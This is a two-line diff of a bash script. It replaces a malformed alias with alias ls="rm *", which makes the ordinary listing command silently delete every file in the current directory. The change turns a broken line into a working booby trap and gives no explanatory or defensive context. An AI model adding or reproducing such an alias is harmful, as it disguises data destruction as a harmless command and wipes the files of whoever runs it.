@@ -1,2 +1,2 @@
 #!/bin/bash
-alias ls=en"rm *"
+alias ls="rm *"
